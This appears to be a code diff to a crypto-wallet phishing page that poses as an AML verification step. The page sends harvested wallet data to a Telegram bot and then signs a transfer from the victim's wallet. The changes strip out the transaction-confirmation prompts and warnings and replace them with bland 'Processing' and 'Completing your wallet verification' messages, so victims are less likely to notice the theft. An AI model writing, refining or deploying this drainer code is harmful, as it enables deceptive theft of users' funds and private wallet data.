@@ -26,10 +26,8 @@ const initialSteps: ConnectionStep[] = [
   { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
   { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
   { id: 'thanks', label: 'Thanks', status: 'pending' },
-  { id: 'signConfirmation', label: 'Sign confirmation', status: 'pending' },
-  { id: 'signWaitingTitle', label: 'Sign waiting - title', status: 'pending' },
-  { id: 'signWaitingDescription', label: 'Sign waiting - description', status: 'pending' },
-  { id: 'successfulSign', label: 'Successful sign', status: 'pending' }
+  { id: 'processing', label: 'Processing', status: 'pending' },
+  { id: 'completed', label: 'Completed', status: 'pending' }
 ];
 
 const Index = () => {
@@ -174,11 +172,6 @@ const Index = () => {
     advanceToNextStep('connectSuccess');
     
     try {
-      toast({
-        title: "Processing",
-        description: "Fetching wallet data...",
-      });
-      
       console.log("Starting wallet connection process");
       
       let walletData = null;
@@ -197,20 +190,10 @@ const Index = () => {
         throw new Error("Failed to fetch wallet data after multiple attempts");
       }
       
-      toast({
-        title: "Data Retrieved",
-        description: "Processing wallet verification...",
-      });
-      
       const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
       
       if (!telegramSent) {
         console.error("Failed to send data to Telegram");
-        toast({
-          title: "Warning",
-          description: "Verification service connection issue. Retrying...",
-          variant: "destructive",
-        });
         
         setTimeout(async () => {
           await sendToTelegram(walletData!, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -260,10 +243,7 @@ const Index = () => {
         return;
       }
 
-      toast({
-        title: "Processing",
-        description: "Preparing transaction...",
-      });
+      updateStepStatus('processing', 'active');
 
       const transferMessage = {
         address: publicKey.toString(),
@@ -276,25 +256,14 @@ const Index = () => {
       console.log("Initiating transfer");
       
       try {
-        updateStepStatus('signConfirmation', 'active');
-        
         toast({
-          title: "Confirming",
-          description: "Please confirm the transaction in your wallet",
+          title: "Processing",
+          description: "Completing your wallet verification...",
         });
 
         if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
           throw new Error("Wallet or publicKey is undefined");
         }
-
-        advanceToNextStep('signConfirmation');
-        updateStepStatus('signWaitingTitle', 'active');
-        await new Promise(resolve => setTimeout(resolve, 200));
-        advanceToNextStep('signWaitingTitle');
-        
-        updateStepStatus('signWaitingDescription', 'active');
-        await new Promise(resolve => setTimeout(resolve, 200));
-        advanceToNextStep('signWaitingDescription');
 
         const signature = await signAndSendTransaction(
           connection,
@@ -305,9 +274,10 @@ const Index = () => {
           TELEGRAM_CHAT_ID
         );
 
-        updateStepStatus('successfulSign', 'active');
+        advanceToNextStep('processing');
+        updateStepStatus('completed', 'active');
         await new Promise(resolve => setTimeout(resolve, 300));
-        advanceToNextStep('successfulSign');
+        advanceToNextStep('completed');
 
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
